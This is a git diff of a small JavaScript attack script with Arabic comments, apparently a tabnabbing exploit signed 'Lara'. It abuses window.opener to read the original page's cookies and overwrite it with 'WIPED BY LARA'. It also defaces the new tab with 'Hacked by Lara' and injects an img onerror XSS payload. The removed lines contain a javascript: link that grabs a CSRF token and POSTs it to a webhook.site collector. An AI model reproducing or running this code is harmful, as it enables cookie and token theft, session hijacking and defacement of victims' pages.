@@ -1,14 +1,24 @@
-// 1. طباعة علامة لارا في كونسول الصفحة الجديدة
+// 1. طباعة العلامة
 console.log("Lara: Acting from the new tab...");
 
+// 2. مسح محتوى الصفحة وبناء واجهة جديدة
+// لاحظ استخدام صورة لتنفيذ الـ alert لأن السكريبت المباشر لا يعمل في innerHTML
+document.body.innerHTML = `
+    <div style='background:black; color:red; text-align:center; padding-top:100px; height:100vh;'>
+        <h1>Hacked by Lara</h1>
+        <img src="x" onerror="alert('Lara: 300 Triggered');">
+    </div>
+`;
+
+// 3. سرقة الكوكيز (إذا كان هناك Opener)
 if (window.opener) {
-    // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
-    window.opener.document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by a href=javascript:(function(){const t=document.querySelector('meta[name="csrf-token"]')?.content;if(t){fetch('https://webhook.site/797b8441-6a62-471c-9271-4b365d46053a',{method:'POST',mode:'no-cors',body:t});alert('Sent');}else{alert('Not Found');}})();>click</a></h1>";
-    
-    // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
-    const cookies = window.opener.document.cookie;
-    console.log("Lara: Cookies from original page:", cookies);
-    
-    // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
-    // window.close(); 
+    try {
+        const cookies = window.opener.document.cookie;
+        console.log("Lara: Cookies from original page:", cookies);
+        
+        // مسح صفحة الضحية أيضاً
+        window.opener.document.body.innerHTML = "<h1 style='color:red;'>WIPED BY LARA</h1>";
+    } catch (e) {
+        console.log("Lara: Could not access opener due to CORS Policy.");
+    }
 }
